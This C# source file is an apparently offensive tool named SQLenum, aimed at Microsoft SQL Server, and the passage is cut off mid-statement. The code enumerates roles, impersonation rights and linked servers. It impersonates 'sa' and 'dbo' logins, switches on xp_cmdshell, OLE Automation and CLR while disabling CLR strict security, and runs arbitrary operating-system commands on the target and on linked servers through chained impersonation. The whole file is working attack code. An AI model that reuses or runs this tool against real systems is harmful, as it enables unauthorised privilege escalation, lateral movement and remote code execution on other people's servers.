using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Data.SqlClient;
using Microsoft.Win32;

namespace SQLenum
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Please enter a Hostname of SQL servers.");
                Console.WriteLine("Usage: SQLenum.exe target1 target2 [options]");
                Console.WriteLine("Local enumeration: SQLenum.exe local");
                Console.WriteLine("Enumeration: SQLenum.exe SQL11");
                Console.WriteLine("Linked server enumeration: SQLenum.exe SQL11 SQL33");
                Console.WriteLine("Options:");
                Console.WriteLine("--localImpersonation=[username] : Local impersonation, default value is sa;");
                Console.WriteLine("--remoteImpersonation=[username] : Remote impersonation, default value is sa;");
                Console.WriteLine("--execute=[commands] : Remote command execution;");
                Console.WriteLine("--debug : Enable debug mode;");
                return;
            }

            String sqlServer = "";
            String database = "master";
            String conString = "";
            String dataSource = "";
            String localImpersonatedLogin = "sa";
            String remoteImpersonatedLogin = "sa";
            String remoteCommands = "";
            Boolean linkEnumeration = false;
            Boolean localImpersonation = false;
            Boolean remoteImpersonation = false;
            Boolean commandExecution = false;
            Boolean debug = false;

            foreach (string arg in args)
            {
                if (arg.StartsWith("--localImpersonation="))
                {
                    string[] components = arg.Split('=');
                    localImpersonatedLogin = components[1];
                    localImpersonation = true;
                }
                else if (arg.StartsWith("--remoteImpersonation="))
                {
                    string[] components = arg.Split('=');
                    remoteImpersonatedLogin = components[1];
                    remoteImpersonation = true;
                }
                else if (arg.StartsWith("--debug"))
                {
                    debug = true;
                }
                else if (arg.StartsWith("--execute="))
                {
                    string[] components = arg.Split('=');
                    remoteCommands = components[1];
                    commandExecution = true;
                }
            }

            //Local enumeration
            if (args[0] == "local")
            {
                RegistryView registryView = Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32;
                using (RegistryKey hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, registryView))
                {
                    RegistryKey instanceKey = hklm.OpenSubKey(@"SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL", false);
                    if (instanceKey != null)
                    {
                        foreach (var instanceName in instanceKey.GetValueNames())
                        {
                            dataSource = Environment.MachineName + @"\" + instanceName;
                        }
                    }
                    else
                    {
                        Console.WriteLine("No SQL instacnce identified on local server!");
                        return;
                    }
                }
                conString = "Data Source = " + dataSource + "; Database = " + database + "; Integrated Security = True;";
            }
            else
            {
                sqlServer = args[0];
                conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            }

            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch (Exception e)
            {
                Console.WriteLine("[Error]"+e.Message);
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            if (args.Length > 1 && args[1].StartsWith("--") != true) linkEnumeration = true;

            //Enumeration on SQL server

            Console.WriteLine("\n===============Enumeration on " + args[0] + " server=================");

            String server_version = "select @@version as version;";
            SqlCommand command = new SqlCommand(server_version, con);
            SqlDataReader reader = command.ExecuteReader();
            while (reader.Read())
            {
                Console.WriteLine("Server version is: " + reader[0]);
            }
            reader.Close();

            String querylogin = "SELECT SYSTEM_USER;";
            command = new SqlCommand(querylogin, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("LOGIN in as: " + reader[0]);
            reader.Close();

            String queryuser = "SELECT USER_NAME();";
            command = new SqlCommand(queryuser, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Mapped to USER: " + reader[0]);
            reader.Close();

            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
            command = new SqlCommand(querypublicrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("User is a member of public role");
            }
            else
            {
                Console.WriteLine("[*] User is NOT a member of public role");
            }
            reader.Close();

            String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            command = new SqlCommand(querysysadminrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("[*] User is a member of sysadmin role");
            }
            else
            {
                Console.WriteLine("User is NOT a member of sysadmin role");
            }
            reader.Close();

            String checkUserRole = "SELECT m.name as name1, r.name as name2 FROM sys.server_role_members rm inner join sys.server_principals r on r.principal_id = rm.role_principal_id inner join sys.server_principals m on m.principal_id = rm.member_principal_id;";
            command = new SqlCommand(checkUserRole, con);
            reader = command.ExecuteReader();
            while (reader.Read() == true)
            {
                Console.WriteLine("User [" + reader[0] + "] is a member of [" + reader[1] + "] role");
            }
            reader.Close();

            //Debug
            if(debug == true)
            {
                String queryLocalPrincipal = "SELECT name FROM sys.server_principals;";
                command = new SqlCommand(queryLocalPrincipal, con);
                reader = command.ExecuteReader();
                while (reader.Read() == true)
                {
                    Console.WriteLine("[Debug] The server principals have: " + reader[0]);
                }
                reader.Close();
            }
            
            //check permission of LOGIN impersonation
            String checkLoginImpersonation = "SELECT c.name, b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id INNER JOIN sys.server_principals c ON a.grantee_principal_id = c.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            command = new SqlCommand(checkLoginImpersonation, con);
            reader = command.ExecuteReader();
            while (reader.Read() == true)
            {
                Console.WriteLine("[*] Server principal [" + reader[0] + "] on " +args[0]+ " can impersonate as LOGIN [" + reader[1] + "] on " + args[0]);
            }
            reader.Close();

            try
            {
                Console.WriteLine("Local LOGIN impersonation:");
                String executeaslogin = "execute as login = '" + localImpersonatedLogin + "'; SELECT SYSTEM_USER;";
                command = new SqlCommand(executeaslogin, con);
                reader = command.ExecuteReader();
                while (reader.Read() == true)
                {
                    Console.WriteLine("Executing in the context of: " + reader[0] + " on " + args[0]);
                }
                reader.Close();

                if (args.Length > 1)
                {
                    checkUserRole = "execute as login = '" + localImpersonatedLogin + "';select name1, name2 from openquery(\"" + args[1] + "\",'SELECT m.name as name1, r.name as name2 FROM sys.server_role_members rm inner join sys.server_principals r on r.principal_id = rm.role_principal_id inner join sys.server_principals m on m.principal_id = rm.member_principal_id;');";
                    command = new SqlCommand(checkUserRole, con);
                    reader = command.ExecuteReader();
                    while (reader.Read() == true)
                    {
                        Console.WriteLine("User [" + reader[0] + "] is a member of [" + reader[1] + "] role on " + args[1]);
                    }
                    reader.Close();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[Error]"+e.Message);
                Console.WriteLine("Local LOGIN impersonation as " + localImpersonatedLogin + " failed");
            }

            //Debug
            if (debug == true)
            {
                String queryDatabasePrincipal = "SELECT name FROM sys.database_principals;";
                command = new SqlCommand(queryDatabasePrincipal, con);
                reader = command.ExecuteReader();
                while (reader.Read() == true)
                {
                    Console.WriteLine("[Debug] The database principals have: " + reader[0]);
                }
                reader.Close();
            }
                
            //check permission of USER impersonation
            String checkUserImpersonation = "SELECT c.name, b.name FROM sys.database_permissions a INNER JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id INNER JOIN sys.database_principals c ON a.grantee_principal_id = c.principal_id WHERE a.type = 'IM';";
            command = new SqlCommand(checkUserImpersonation, con);
            reader = command.ExecuteReader();
            while (reader.Read() == true)
            {
                Console.WriteLine("[*] Database principal [" + reader[0] + "] can impersonate as USER [" + reader[1] + "]");
            }
            reader.Close();

            String Trustworthy = "select name from sys.databases where is_trustworthy_on = 1;";
            command = new SqlCommand(Trustworthy, con);
            reader = command.ExecuteReader();
            while (reader.Read() == true)
            {
                Console.WriteLine("[*] Database with Trustworthy enabled: " + reader[0]);
            }
            reader.Close();

            try
            {
                String executeasuser = "use msdb; EXECUTE AS USER = 'dbo';";
                command = new SqlCommand(executeasuser, con);
                reader = command.ExecuteReader();
                reader.Close();
                Console.WriteLine("After USER dbo impersonation");

                command = new SqlCommand(queryuser, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Executing in the context of: " + reader[0]);
                reader.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine("[Error]"+e.Message);
                Console.WriteLine("USER dbo impersonation failed");
            }

            String execCmd = "EXEC sp_linkedservers;";
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            while (reader.Read())
            {
                Console.WriteLine("Linked SQL Server: " + reader[0]);
            }
            reader.Close();

            String linked_logins = "SELECT sp.name, s.name, ll.remote_name FROM sys.linked_logins ll INNER JOIN sys.server_principals sp ON ll.local_principal_id = sp.principal_id INNER JOIN sys.servers s ON s.server_id = ll.server_id";
            command = new SqlCommand(linked_logins, con);
            reader = command.ExecuteReader();
            while (reader.Read())
            {
                Console.WriteLine("Server principal [" + reader[0] + "] on Server " + args[0] + " linked to remote Server " + reader[1] + " as Remote user name: [" + reader[2] + "];");
            }
            reader.Close();


            //Check and enable advanced functions
            try
            {
                String enableShell = "EXEC sp_configure 'show advanced options',1; RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                command = new SqlCommand(enableShell, con);
                reader = command.ExecuteReader();
                reader.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine("[Error]"+e.Message);
                Console.WriteLine("xp_cmdshell enable failed");
            }

            String checkshell = "SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = 'xp_cmdshell';";
            command = new SqlCommand(checkshell, con);
            reader = command.ExecuteReader();
            while (reader.Read())
            {
                Int32 status = Int32.Parse(reader[0].ToString());
                if (status == 1) Console.WriteLine("[*] xp_cmdshell status: Enabled!");
                else Console.WriteLine("xp_cmdshell status: disabled");
            }
            reader.Close();

            try
            {
                String enableOle = "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                command = new SqlCommand(enableOle, con);
                reader = command.ExecuteReader();
                reader.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine("[Error]"+e.Message);
                Console.WriteLine("Ole enable failed");
            }

            String checkOle = "SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = 'Ole Automation Procedures';";
            command = new SqlCommand(checkOle, con);
            reader = command.ExecuteReader();
            while (reader.Read())
            {
                Int32 status = Int32.Parse(reader[0].ToString());
                if (status == 1) Console.WriteLine("[*] Ole Automation Procedures status: Enabled!");
                else Console.WriteLine("Ole Automation Procedures status: disabled");
            }
            reader.Close();

            try
            {
                String enableclr = "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'clr enabled', 1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
                command = new SqlCommand(enableclr, con);
                reader = command.ExecuteReader();
                reader.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine("[Error]"+e.Message);
                Console.WriteLine("clr enable failed");
            }

            String checkclr = "SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = 'clr enabled';";
            command = new SqlCommand(checkclr, con);
            reader = command.ExecuteReader();
            while (reader.Read())
            {
                Int32 status = Int32.Parse(reader[0].ToString());
                if (status == 1) Console.WriteLine("[*] clr status: Enabled!");
                else Console.WriteLine("clr status: disabled");
            }
            reader.Close();

            String checkclrss = "SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = 'clr strict security';";
            command = new SqlCommand(checkclrss, con);
            reader = command.ExecuteReader();
            while (reader.Read())
            {
                Int32 status = Int32.Parse(reader[0].ToString());
                if (status == 1) Console.WriteLine("clr strict security status: enabled");
                else Console.WriteLine("[*] clr strict security status: Disabled!");
            }
            reader.Close();

            if (commandExecution == true)
            {
                try
                {
                    Console.WriteLine("\n=====Executing commands using current context on " + args[0] + "=====");

                    String execRemoteCmd = "EXEC xp_cmdshell '" + remoteCommands + "';";
                    command = new SqlCommand(execRemoteCmd, con);
                    reader = command.ExecuteReader();
                    Console.WriteLine("Remote commands executed.");
                    reader.Close();
                }
                catch (Exception e)
                {
                    Console.WriteLine("[Error]" + e.Message);
                    Console.WriteLine("Command execution using current context on " + args[0] + " failed");
                }
            }

            //Enumeration on remote linked SQL server
            if (linkEnumeration == true)
            {
                
                Console.WriteLine("\n===============Enumeration on " + args[1] + " server=================");

                //using local Impersonated context
                if (localImpersonation == true)
                {
                    if (remoteImpersonation == true)
                    {
                        Console.WriteLine("\n=====Check advanced functions using impersonated context " + args[0] + "\\" + localImpersonatedLogin + " on " + args[0] + " and " + args[1] + "\\" + remoteImpersonatedLogin + " on " + args[1] + "=====");

                        try
                        {
                            String enableCmdShell = "EXEC('execute(''EXEC(''''sp_configure ''''''''xp_cmdshell'''''''', 1''''); RECONFIGURE;'') as login = ''" + remoteImpersonatedLogin + "'';') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
                            command = new SqlCommand(enableCmdShell, con);
                            reader = command.ExecuteReader();
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("xp_cmdshell enable failed");
                        }

                        try
                        {
                            checkshell = "EXEC('execute(''SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = ''''xp_cmdshell'''';'') as login = ''" + remoteImpersonatedLogin + "'';') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
                            command = new SqlCommand(checkshell, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Int32 status = Int32.Parse(reader[0].ToString());
                                if (status == 1) Console.WriteLine("[*] xp_cmdshell status on " + args[1] + ": Enabled!");
                                else Console.WriteLine("xp_cmdshell status on " + args[1] + ": disabled");
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("xp_cmdshell status checking failed");
                        }


                        try
                        {
                            String enableCmdShell = "EXEC('execute(''EXEC(''''sp_configure ''''''''Ole Automation Procedures'''''''', 1''''); RECONFIGURE;'') as login = ''" + remoteImpersonatedLogin + "'';') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
                            command = new SqlCommand(enableCmdShell, con);
                            reader = command.ExecuteReader();
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("Ole Automation Procedures enable failed");
                        }

                        try
                        {
                            checkshell = "EXEC('execute(''SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = ''''Ole Automation Procedures'''';'') as login = ''" + remoteImpersonatedLogin + "'';') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
                            command = new SqlCommand(checkshell, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Int32 status = Int32.Parse(reader[0].ToString());
                                if (status == 1) Console.WriteLine("[*] Ole Automation Procedures status on " + args[1] + ": Enabled!");
                                else Console.WriteLine("Ole Automation Procedures status on " + args[1] + ": disabled");
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("Ole Automation Procedures status checking failed");
                        }

                        try
                        {
                            String enableCmdShell = "EXEC('execute(''EXEC(''''sp_configure ''''''''clr enabled'''''''', 1''''); RECONFIGURE; EXEC(''''sp_configure ''''''''clr strict security'''''''', 0''''); RECONFIGURE;'') as login = ''" + remoteImpersonatedLogin + "'';') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
                            command = new SqlCommand(enableCmdShell, con);
                            reader = command.ExecuteReader();
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("clr enable failed");
                        }

                        try
                        {
                            checkshell = "EXEC('execute(''SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = ''''clr enabled'''';'') as login = ''" + remoteImpersonatedLogin + "'';') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
                            command = new SqlCommand(checkshell, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Int32 status = Int32.Parse(reader[0].ToString());
                                if (status == 1) Console.WriteLine("[*] clr enabled status on " + args[1] + ": Enabled!");
                                else Console.WriteLine("clr enabled status on " + args[1] + ": disabled");
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("clr enabled status checking failed");
                        }

                        try
                        {
                            checkshell = "EXEC('execute(''SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = ''''clr strict security'''';'') as login = ''" + remoteImpersonatedLogin + "'';') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
                            command = new SqlCommand(checkshell, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Int32 status = Int32.Parse(reader[0].ToString());
                                if (status == 1) Console.WriteLine("clr strict security enabled status on " + args[1] + ": enabled.");
                                else Console.WriteLine("[*] clr strict security enabled status on " + args[1] + ": Disabled!");
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("clr strict security status checking failed");
                        }
                        if (commandExecution == true)
                        {
                            try
                            {
                                Console.WriteLine("\n=====Executing commands using impersonated context " + args[0] + "\\" + localImpersonatedLogin + " on " + args[0] + " and " + args[1] + "\\" + remoteImpersonatedLogin + " on " + args[1] + "=====");

                                String execRemoteCmd = "EXEC('execute(''EXEC(''''xp_cmdshell ''''''''" + remoteCommands + "'''''''';'''');'') as login = ''" + remoteImpersonatedLogin + "'';') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
                                command = new SqlCommand(execRemoteCmd, con);
                                reader = command.ExecuteReader();
                                Console.WriteLine("Remote commands executed.");
                                reader.Close();
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[Error]" + e.Message);
                                Console.WriteLine("Command execution using " + args[1] + "\\" + remoteImpersonatedLogin + " on " + args[1] + " failed");
                            }
                        }
                    }
                    else
                    {
                        try
                        {
                            String getVersion = "execute('select version from openquery(\"" + args[1] + "\", ''select @@version as version;'');') as login = '" + localImpersonatedLogin + "';";
                            command = new SqlCommand(getVersion, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Console.WriteLine("Linked SQL server version: " + reader[0]);
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("Cannot connect to Linked SQL server using current context!");
                            return;
                        }

                        querylogin = "execute('select * from openquery(\"" + args[1] + "\",''SELECT SYSTEM_USER;'');') as login = '" + localImpersonatedLogin + "';";
                        command = new SqlCommand(querylogin, con);
                        reader = command.ExecuteReader();
                        reader.Read();
                        Console.WriteLine("Logged in as: " + reader[0] + " on " + args[1]);
                        reader.Close();

                        queryuser = "execute('select * from openquery(\"" + args[1] + "\",''SELECT USER_NAME();'');') as login = '" + localImpersonatedLogin + "';";
                        command = new SqlCommand(queryuser, con);
                        reader = command.ExecuteReader();
                        reader.Read();
                        Console.WriteLine("Mapped to user: " + reader[0] + " on " + args[1]);
                        reader.Close();

                        querypublicrole = "execute('select * from openquery(\"" + args[1] + "\",''SELECT IS_SRVROLEMEMBER(''''public'''');'');') as login = '" + localImpersonatedLogin + "';";
                        command = new SqlCommand(querypublicrole, con);
                        reader = command.ExecuteReader();
                        reader.Read();
                        role = Int32.Parse(reader[0].ToString());
                        if (role == 1)
                        {
                            Console.WriteLine("User is a member of public role");
                        }
                        else
                        {
                            Console.WriteLine("User is NOT a member of public role");
                        }
                        reader.Close();

                        querysysadminrole = "execute('select * from openquery(\"" + args[1] + "\",''SELECT IS_SRVROLEMEMBER(''''sysadmin'''');'');') as login = '" + localImpersonatedLogin + "';";
                        command = new SqlCommand(querysysadminrole, con);
                        reader = command.ExecuteReader();
                        reader.Read();
                        role = Int32.Parse(reader[0].ToString());
                        if (role == 1)
                        {
                            Console.WriteLine("[*] User is a member of sysadmin role");
                        }
                        else
                        {
                            Console.WriteLine("User is NOT a member of sysadmin role");
                        }
                        reader.Close();

                        checkUserRole = "execute('select name1, name2 from openquery(\"" + args[1] + "\",''SELECT m.name as name1, r.name as name2 FROM sys.server_role_members rm inner join sys.server_principals r on r.principal_id = rm.role_principal_id inner join sys.server_principals m on m.principal_id = rm.member_principal_id;'');') as login = '" + localImpersonatedLogin + "';";
                        command = new SqlCommand(checkUserRole, con);
                        reader = command.ExecuteReader();
                        while (reader.Read() == true)
                        {
                            Console.WriteLine("User [" + reader[0] + "] is a member of [" + reader[1] + "] role on " + args[1]);
                        }
                        reader.Close();

                        //Debug
                        if (debug == true)
                        {
                            String queryLocalPrincipal = "execute('select name from openquery(\"" + args[1] + "\",''SELECT name FROM sys.server_principals;'')') as login = '" + localImpersonatedLogin + "';";
                            command = new SqlCommand(queryLocalPrincipal, con);
                            reader = command.ExecuteReader();
                            while (reader.Read() == true)
                            {
                                Console.WriteLine("[Debug] The server principals on: " + args[1] + " have :" + reader[0]);
                            }
                            reader.Close();
                        }

                        //check permission of remote LOGIN impersonation
                        String queryRemote = "execute('select name1, name2 from openquery(\"" + args[1] + "\",''SELECT c.name as name1, b.name as name2 FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id INNER JOIN sys.server_principals c ON a.grantee_principal_id = c.principal_id WHERE a.permission_name = ''''IMPERSONATE'''';'');') as login = '" + localImpersonatedLogin + "';";
                        command = new SqlCommand(queryRemote, con);
                        reader = command.ExecuteReader();
                        while (reader.Read() == true)
                        {
                            Console.WriteLine("[*] Server principal [" + reader[0] + "] on " + args[0] + " can impersonate as LOGIN [" + reader[1] + "] on " + args[1]);
                        }
                        reader.Close();

                        try
                        {
                            Console.WriteLine("Remote LOGIN impersonation:");
                            String executeaslogin = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; SELECT SYSTEM_USER;') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
                            command = new SqlCommand(executeaslogin, con);
                            reader = command.ExecuteReader();
                            while (reader.Read() == true)
                            {
                                Console.WriteLine("Executing in the context of: " + reader[0] + " on " + args[1]);
                            }
                            reader.Close();

                            checkUserRole = "execute('select name1, name2 from openquery(\"" + args[1] + "\",''execute as login = ''''" + remoteImpersonatedLogin + "''''; SELECT m.name as name1, r.name as name2 FROM sys.server_role_members rm inner join sys.server_principals r on r.principal_id = rm.role_principal_id inner join sys.server_principals m on m.principal_id = rm.member_principal_id;'');') as login = '" + localImpersonatedLogin + "';";
                            command = new SqlCommand(checkUserRole, con);
                            reader = command.ExecuteReader();
                            while (reader.Read() == true)
                            {
                                Console.WriteLine("User [" + reader[0] + "] is a member of [" + reader[1] + "] role on " + args[1]);
                            }
                            reader.Close();

                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("Remote LOGIN impersonation as " + remoteImpersonatedLogin + " failed");
                        }

                        //Debug

                        if (debug == true)
                        {
                            command = new SqlCommand(querylogin, con);
                            reader = command.ExecuteReader();
                            reader.Read();
                            Console.WriteLine("Logged in as: " + reader[0] + " on " + args[1]);
                            reader.Close();

                            String queryDatabasePrincipal = "execute('select name from openquery(\"" + args[1] + "\",''SELECT name FROM sys.database_principals;'')') as login = '" + localImpersonatedLogin + "';";
                            command = new SqlCommand(queryDatabasePrincipal, con);
                            reader = command.ExecuteReader();
                            while (reader.Read() == true)
                            {
                                Console.WriteLine("[Debug] The database principals on: " + args[1] + " have :" + reader[0]);
                            }
                            reader.Close();
                        }

                        queryRemote = "execute('select name1, name2 from openquery(\"" + args[1] + "\",''SELECT c.name as name1, b.name as name2 FROM sys.database_permissions a INNER JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id INNER JOIN sys.database_principals c ON a.grantee_principal_id = c.principal_id WHERE a.type = ''''IM'''';'');') as login = '" + localImpersonatedLogin + "'; ";
                        command = new SqlCommand(queryRemote, con);
                        reader = command.ExecuteReader();
                        while (reader.Read() == true)
                        {
                            Console.WriteLine("[*] Remote Database principal [" + reader[0] + "] can impersonate as USER [" + reader[1] + "] on " + args[1]);
                        }
                        reader.Close();

                        Trustworthy = "execute('select name from openquery(\"" + args[1] + "\",''SELECT name from sys.databases where is_trustworthy_on = 1;'');') as login = '" + localImpersonatedLogin + "';";
                        command = new SqlCommand(Trustworthy, con);
                        reader = command.ExecuteReader();
                        while (reader.Read() == true)
                        {
                            Console.WriteLine("[*] Database with Trustworthy enabled on " + args[1] + ": " + reader[0]);
                        }
                        reader.Close();

                        try
                        {
                            Console.WriteLine("USER dbo impersonation:");
                            String executeasuser = "EXEC('execute as USER = ''dbo''; SELECT USER_NAME();') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
                            command = new SqlCommand(executeasuser, con);
                            reader = command.ExecuteReader();
                            while (reader.Read() == true)
                            {
                                Console.WriteLine("Executing in the context of: " + reader[0] + " on " + args[1]);
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("USER dbo impersonation failed");
                        }

                        execCmd = "execute('select * from openquery(\"" + args[1] + "\",''EXEC sp_linkedservers;'');') as login = '" + localImpersonatedLogin + "';";
                        command = new SqlCommand(execCmd, con);
                        reader = command.ExecuteReader();
                        while (reader.Read())
                        {
                            Console.WriteLine("Linked SQL Server on: " + args[1] + " have :" + reader[0]);
                        }
                        reader.Close();

                        linked_logins = "execute('select name1, name2, name3 from openquery(\"" + args[1] + "\",''SELECT sp.name as name1, s.name as name2, ll.remote_name as name3 FROM sys.linked_logins ll INNER JOIN sys.server_principals sp ON ll.local_principal_id = sp.principal_id INNER JOIN sys.servers s ON s.server_id = ll.server_id;'');') as login = '" + localImpersonatedLogin + "';";
                        command = new SqlCommand(linked_logins, con);
                        reader = command.ExecuteReader();
                        while (reader.Read())
                        {
                            Console.WriteLine("Server principal " + reader[0] + " on Server " + args[1] + " linked to remote Server " + reader[1] + " as Remote user name: " + reader[2]);
                        }
                        reader.Close();

                        //Check advanced functions using impersonated context on local server, for e.g tester is a local user which used to link remote server
                        Console.WriteLine("\n=====Check advanced functions using impersonated context " + args[0] + "\\" + localImpersonatedLogin + " on " + args[1] + "=====");

                        String enableAdv = "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";

                        try
                        {
                            String enableShell = "EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
                            command = new SqlCommand(enableAdv, con);
                            reader = command.ExecuteReader();
                            reader.Close();
                            command = new SqlCommand(enableShell, con);
                            reader = command.ExecuteReader();
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("xp_cmdshell enable failed");
                        }

                        try
                        {
                            checkshell = "execute('select * from openquery(\"" + args[1] + "\",''SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = ''''xp_cmdshell'''';'');') as login = '" + localImpersonatedLogin + "'; ";
                            command = new SqlCommand(checkshell, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Int32 status = Int32.Parse(reader[0].ToString());
                                if (status == 1) Console.WriteLine("[*] xp_cmdshell status on " + args[1] + ": Enabled!");
                                else Console.WriteLine("xp_cmdshell status on " + args[1] + ": disabled");
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("xp_cmdshell status checking failed");
                        }

                        try
                        {
                            String enableOle = "EXEC ('sp_configure ''Ole Automation Procedures'', 1; RECONFIGURE;') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
                            command = new SqlCommand(enableAdv, con);
                            reader = command.ExecuteReader();
                            reader.Close();
                            command = new SqlCommand(enableOle, con);
                            reader = command.ExecuteReader();
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("Ole enable failed");
                        }

                        try
                        {
                            checkOle = "execute('select * from openquery(\"" + args[1] + "\",''SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = ''''Ole Automation Procedures'''';'');') as login = '" + localImpersonatedLogin + "';";
                            command = new SqlCommand(checkOle, con);
                            reader = command.ExecuteReader();
                            while (reader.Read())
                            {
                                Int32 status = Int32.Parse(reader[0].ToString());
                                if (status == 1) Console.WriteLine("[*] Ole Automation Procedures status on " + args[1] + ": Enabled!");
                                else Console.WriteLine("Ole Automation Procedures status on " + args[1] + ": disabled");
                            }
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("Ole Automation Procedures status checking failed");
                        }
                        try
                        {
                            String enableclr1 = "EXEC ('sp_configure ''clr enabled'', 1; RECONFIGURE;') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
                            command = new SqlCommand(enableclr1, con);
                            reader = command.ExecuteReader();
                            reader.Close();

                            String enableclr2 = "EXEC ('sp_configure ''clr strict security'', 0; RECONFIGURE;') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
                            command = new SqlCommand(enableclr2, con);
                            reader = command.ExecuteReader();
                            reader.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[Error]" + e.Message);
                            Console.WriteLine("clr enable failed");
                        }

                        try
                        {
                            checkclr = "execute('select * from openquery(\"" + args[1] + "\",''SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = ''''clr enabled'''';'');') as login = '" + localImpersonatedLogin + "';";
